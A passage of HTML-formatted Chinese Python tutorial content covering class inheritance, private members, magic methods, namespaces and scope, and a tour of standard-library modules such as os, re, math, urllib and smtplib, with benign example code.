punctuation">.</span>__init__<span class="token punctuation">(</span>参数<span class="token number">1</span>，参数<span class="token number">2</span>，<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有一种经典写法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">父类名称<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>参数<span class="token number">1</span>，参数<span class="token number">2</span>，<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Father</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name<span class="token operator">=</span>name        <span class="token keyword">print</span> <span class="token punctuation">(</span> <span class="token string">"name: %s"</span> <span class="token operator">%</span><span class="token punctuation">(</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">getName</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Father '</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>name <span class="token keyword">class</span> <span class="token class-name">Son</span><span class="token punctuation">(</span>Father<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Son<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"hi"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span>  name    <span class="token keyword">def</span> <span class="token function">getName</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Son '</span><span class="token operator">+</span>self<span class="token punctuation">.</span>name <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    son<span class="token operator">=</span>Son<span class="token punctuation">(</span><span class="token string">'runoob'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span> son<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''name: runoobhiSon runoob'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="类属性与方法"><a href="#类属性与方法" class="headerlink" title="类属性与方法"></a>类属性与方法</h3><h4 id="类的私有属性"><a href="#类的私有属性" class="headerlink" title="类的私有属性"></a>类的私有属性</h4><p><strong>__private_attrs</strong>：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 <strong>self.__private_attrs</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">JustCounter</span><span class="token punctuation">:</span>    __secretCount <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 私有变量</span>    publicCount <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment"># 公开变量</span>     <span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>__secretCount <span class="token operator">+=</span> <span class="token number">1</span>        self<span class="token punctuation">.</span>publicCount <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>__secretCount<span class="token punctuation">)</span> counter <span class="token operator">=</span> JustCounter<span class="token punctuation">(</span><span class="token punctuation">)</span>counter<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span>counter<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>counter<span class="token punctuation">.</span>publicCount<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>counter<span class="token punctuation">.</span>__secretCount<span class="token punctuation">)</span>  <span class="token comment"># 报错，实例不能访问私有变量</span><span class="token triple-quoted-string string">'''122Traceback (most recent call last):  File "test.py", line 16, in &lt;module&gt;    print (counter.__secretCount)  # 报错，实例不能访问私有变量AttributeError: 'JustCounter' object has no attribute '__secretCount''''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="类的方法-1"><a href="#类的方法-1" class="headerlink" title="类的方法"></a>类的方法</h4><p>在类的内部，使用 def 关键字来定义一个方法，与一般函数定义不同，类方法必须包含参数 <strong>self</strong>，且为第一个参数，<strong>self</strong> 代表的是类的实例</p><p><strong>self</strong> 的名字并不是规定死的，也可以使用 <strong>this</strong>，但是最好还是按照约定使用 <strong>self</strong></p><h4 id="类的私有方法"><a href="#类的私有方法" class="headerlink" title="类的私有方法"></a>类的私有方法</h4><p><strong>__private_method</strong>：两个下划线开头，声明该方法为私有方法，只能在类的内部调用 ，不能在类的外部调用<strong>self.__private_methods</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Site</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name       <span class="token comment"># public</span>        self<span class="token punctuation">.</span>__url <span class="token operator">=</span> url   <span class="token comment"># private</span>     <span class="token keyword">def</span> <span class="token function">who</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'name  : '</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'url : '</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>__url<span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">__foo</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment"># 私有方法</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'这是私有方法'</span><span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 公共方法</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'这是公共方法'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>__foo<span class="token punctuation">(</span><span class="token punctuation">)</span> x <span class="token operator">=</span> Site<span class="token punctuation">(</span><span class="token string">'菜鸟教程'</span><span class="token punctuation">,</span> <span class="token string">'www.runoob.com'</span><span class="token punctuation">)</span>x<span class="token punctuation">.</span>who<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 正常输出</span>x<span class="token punctuation">.</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 正常输出</span>x<span class="token punctuation">.</span>__foo<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment"># 报错</span><span class="token triple-quoted-string string">'''name  :  菜鸟教程url :  www.runoob.com这是公共方法这是私有方法Traceback (most recent call last):  File xxxx in &lt;module&gt;    x.__foo()  # 报错AttributeError: 'Site' object has no attribute '__foo''''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="类的专有方法"><a href="#类的专有方法" class="headerlink" title="类的专有方法"></a>类的专有方法</h3><ul><li><strong><strong>init</strong> :</strong> 构造函数，在生成对象时调用</li><li><strong><strong>del</strong> :</strong> 析构函数，释放对象时使用</li><li><strong><strong>repr</strong> :</strong> 打印，转换</li><li><strong><strong>setitem</strong> :</strong> 按照索引赋值</li><li><strong><strong>getitem</strong>:</strong> 按照索引获取值</li><li><strong><strong>len</strong>:</strong> 获得长度</li><li><strong><strong>cmp</strong>:</strong> 比较运算</li><li><strong><strong>call</strong>:</strong> 函数调用</li><li><strong><strong>add</strong>:</strong> 加运算</li><li><strong><strong>sub</strong>:</strong> 减运算</li><li><strong><strong>mul</strong>:</strong> 乘运算</li><li><strong><strong>truediv</strong>:</strong> 除运算</li><li><strong><strong>mod</strong>:</strong> 求余运算</li><li><strong><strong>pow</strong>:</strong> 乘方</li></ul><h3 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Vector</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>a <span class="token operator">=</span> a      self<span class="token punctuation">.</span>b <span class="token operator">=</span> b    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token string">'Vector (%d, %d)'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a<span class="token punctuation">,</span> self<span class="token punctuation">.</span>b<span class="token punctuation">)</span>      <span class="token keyword">def</span> <span class="token function">__add__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> Vector<span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">+</span> other<span class="token punctuation">.</span>a<span class="token punctuation">,</span> self<span class="token punctuation">.</span>b <span class="token operator">+</span> other<span class="token punctuation">.</span>b<span class="token punctuation">)</span> v1 <span class="token operator">=</span> Vector<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>v2 <span class="token operator">=</span> Vector<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>v1 <span class="token operator">+</span> v2<span class="token punctuation">)</span><span class="token comment"># Vector(7,8)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="命名空间和作用域"><a href="#命名空间和作用域" class="headerlink" title="命名空间和作用域"></a>命名空间和作用域</h2><h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><ol><li>命名空间(Namespace)是从名称到对象的映射，大部分的命名空间都是通过 Python 字典来实现的</li><li>各个命名空间是独立的，所以一个命名空间中不能有重名，不同的命名空间可以重名</li><li>命名空间的生命周期取决于对象的作用域，如果对象执行完成，则该命名空间的生命周期就结束</li><li>无法从外部命名空间访问内部命名空间的对象</li></ol><p>三种命名空间</p><ul><li><strong>内置名称（built-in names</strong>）， Python 语言内置的名称，比如函数名 abs、char 和异常名称 BaseException、Exception 等等</li><li><strong>全局名称（global names）</strong>，模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量</li><li><strong>局部名称（local names）</strong>，函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）</li></ul><p>查找顺序为：<strong>局部的命名空间去 -&gt; 全局命名空间 -&gt; 内置命名空间</strong></p><p>如果找不到变量，它将放弃查找并引发一个 NameError 异常</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># var1 是全局名称</span>var1 <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">def</span> <span class="token function">some_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment"># var2 是局部名称</span>    var2 <span class="token operator">=</span> <span class="token number">6</span>    <span class="token keyword">def</span> <span class="token function">some_inner_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token comment"># var3 是内嵌的局部名称</span>        var3 <span class="token operator">=</span> <span class="token number">7</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><ol><li>作用域就是一个 Python 程序可以直接访问命名空间的正文区域</li><li>程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的</li></ol><p>四种作用域</p><ul><li><strong>L（Local）</strong>：最内层，包含局部变量，比如一个函数/方法内部</li><li><strong>E（Enclosing）</strong>：包含了非局部(non-local)也非全局(non-global)的变量。比如两个嵌套函数，一个函数（或类） A 里面又包含了一个函数 B ，那么对于 B 中的名称来说 A 中的作用域就为 nonlocal</li><li><strong>G（Global）</strong>：当前脚本的最外层，比如当前模块的全局变量。</li><li><strong>B（Built-in）</strong>： 包含了内建的变量/关键字等，最后被搜索。</li></ul><p>规则顺序： <strong>L –&gt; E –&gt; G –&gt; B</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">g_count <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 全局作用域</span><span class="token keyword">def</span> <span class="token function">outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    o_count <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 闭包函数外的函数中</span>    <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        i_count <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment"># 局部作用域</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>内置作用域通过一个名为 builtin 的标准模块来实现</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> builtins<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span>builtins<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 输出预定义变量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Python 中只有模块（module），类（class）以及函数（def、lambda）才会引入新的作用域，其它的代码块（如 if/elif/else/、try/except、for/while等）是不会引入新的作用域的，也就是说这些语句内定义的变量，外部也可以访问</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> <span class="token string">'I am from Runoob'</span>  <span class="token comment"># 外部可以访问</span>    <span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    msg_inner <span class="token operator">=</span> <span class="token string">'I am from Runoob'</span>  <span class="token comment"># 外部不能访问</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="全局变量和局部变量"><a href="#全局变量和局部变量" class="headerlink" title="全局变量和局部变量"></a>全局变量和局部变量</h3><ol><li>定义在函数内部的变量拥有一个局部作用域，定义在函数外的拥有全局作用域</li><li>局部变量只能在其被声明的函数内部访问，而全局变量可以在整个程序范围内访问</li><li>调用函数时，所有在函数内声明的变量名称都将被加入到作用域中</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">total <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment"># 这是一个全局变量</span><span class="token comment"># 可写函数说明</span><span class="token keyword">def</span> <span class="token function">sum</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> arg2 <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#返回2个参数的和."</span>    total <span class="token operator">=</span> arg1 <span class="token operator">+</span> arg2 <span class="token comment"># total在这里是局部变量.</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"函数内是局部变量 : "</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span>    <span class="token keyword">return</span> total <span class="token comment">#调用sum函数</span><span class="token builtin">sum</span><span class="token punctuation">(</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"函数外是全局变量 : "</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''函数内是局部变量 :  30函数外是全局变量 :  0'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="global-和-nonlocal关键字"><a href="#global-和-nonlocal关键字" class="headerlink" title="global 和 nonlocal关键字"></a>global 和 nonlocal关键字</h3><p>当内部作用域想修改外部作用域的变量时，用到 global 和 nonlocal 关键字</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 修改全局变量 num</span>num <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> num  <span class="token comment"># 需要使用 global 关键字声明</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>     num <span class="token operator">=</span> <span class="token number">123</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>fun1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''1123123'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nonlocal 修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token number">10</span>    <span class="token keyword">def</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">nonlocal</span> num   <span class="token comment"># nonlocal关键字声明</span>        num <span class="token operator">=</span> <span class="token number">100</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>    inner<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>outer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''100100'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="标准库概览"><a href="#标准库概览" class="headerlink" title="标准库概览"></a>标准库概览</h2><h3 id="操作系统接口"><a href="#操作系统接口" class="headerlink" title="操作系统接口"></a>操作系统接口</h3><p>os模块提供了不少与操作系统相关联的函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 返回当前的工作目录</span>os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span><span class="token string">'/server/accesslogs'</span><span class="token punctuation">)</span>   <span class="token comment"># 修改当前的工作目录</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'mkdir today'</span><span class="token punctuation">)</span>   <span class="token comment"># 执行系统命令 mkdir</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># returns a list of all module functions</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">help</span><span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 帮助文档</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>针对日常的文件和目录管理任务，:mod:shutil 模块提供了一个易于使用的高级接口</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> shutilshutil<span class="token punctuation">.</span>copyfile<span class="token punctuation">(</span><span class="token string">'data.db'</span><span class="token punctuation">,</span> <span class="token string">'archive.db'</span><span class="token punctuation">)</span>shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token string">'/build/executables'</span><span class="token punctuation">,</span> <span class="token string">'installdir'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="文件通配符"><a href="#文件通配符" class="headerlink" title="文件通配符"></a>文件通配符</h3><p>glob模块提供了一个函数用于从目录通配符搜索中生成文件列表</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> glob<span class="token keyword">print</span><span class="token punctuation">(</span>glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">'*.py'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ['xxx.py', 'xxx.py', 'xxx.py']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3><p>通用工具脚本经常调用命令行参数。这些命令行参数以链表形式存储于 sys 模块的 argv 变量。例如在命令行中执行 “python demo.py one two three” 后可以得到以下输出结果:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">print</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="错误输出重定向和程序终止"><a href="#错误输出重定向和程序终止" class="headerlink" title="错误输出重定向和程序终止"></a>错误输出重定向和程序终止</h3><p>sys 还有 stdin，stdout 和 stderr 属性，即使在 stdout 被重定向时，后者也可以用于显示警告和错误信息</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">sys<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Warning, log file not found starting a new one\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>大多脚本的定向终止都使用 sys.exit()</p><h3 id="字符串正则匹配"><a href="#字符串正则匹配" class="headerlink" title="字符串正则匹配"></a>字符串正则匹配</h3><p>re模块为高级字符串处理提供了正则表达式工具</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'\bf[a-z]*'</span><span class="token punctuation">,</span> <span class="token string">'which foot or hand fell fastest'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ['foot', 'fell', 'fastest']</span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'(\b[a-z]+) \1'</span><span class="token punctuation">,</span> <span class="token string">r'\1'</span><span class="token punctuation">,</span> <span class="token string">'cat in the the hat'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 'cat in the hat'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><p>math模块为浮点运算提供了对底层C函数库的访问</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> math<span class="token keyword">print</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>cos<span class="token punctuation">(</span>math<span class="token punctuation">.</span>pi <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 0.70710678118654757</span><span class="token keyword">print</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 10.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>random提供了生成随机数的工具</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'pear'</span><span class="token punctuation">,</span> <span class="token string">'banana'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 'apple'</span><span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># sampling without replacement</span><span class="token comment"># [30, 83, 16, 4, 8, 81, 41, 50, 18, 33]</span><span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># random float</span><span class="token comment"># 0.17970987693706186</span><span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># random integer chosen from range(6)</span><span class="token comment"># 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="访问互联网"><a href="#访问互联网" class="headerlink" title="访问互联网"></a>访问互联网</h3><p>有几个模块用于访问互联网以及处理网络通信协议，处理从 urls 接收的数据的 urllib.request 以及用于发送电子邮件的 smtplib</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> urlopen<span class="token keyword">for</span> line <span class="token keyword">in</span> urlopen<span class="token punctuation">(</span><span class="token string">'http://tycho.usno.navy.mil/cgi-bin/timer.pl'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    line <span class="token operator">=</span> line<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># Decoding the binary data to text.</span>    <span class="token keyword">if</span> <span class="token string">'EST'</span> <span class="token keyword">in</span> line <span class="token keyword">or</span> <span class="token string">'EDT'</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>  <span class="token comment"># look for Eastern Time</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token comment"># &lt;BR&gt;Nov. 25, 09:43:32 PM EST</span><span class="token keyword">import</span> smtplibserver <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span><span class="token string">'soothsayer@example.org'</span><span class="token punctuation">,</span> <span class="token string">'jcaesar@example.org'</span><span class="token punctuation">,</span>                <span class="token triple-quoted-string string">"""To: jcaesar@example.orgFrom: soothsayer@example.orgBeware the Ides of March."""</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="日期和时间"><a href="#日期和时间" class="headerlink" title="日期和时间"></a>日期和时间</h3><p>datetime模块为日期和时间处理</p><p>该模块还支持时区处理</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># dates are easily constructed and formatted</span><span class="token keyword">from</span> datetime <span class="token keyword">import</span> datenow <span class="token operator">=</span> date<span class="token punctuation">.</span>today<span class="token punctuation">(</span><span class="token 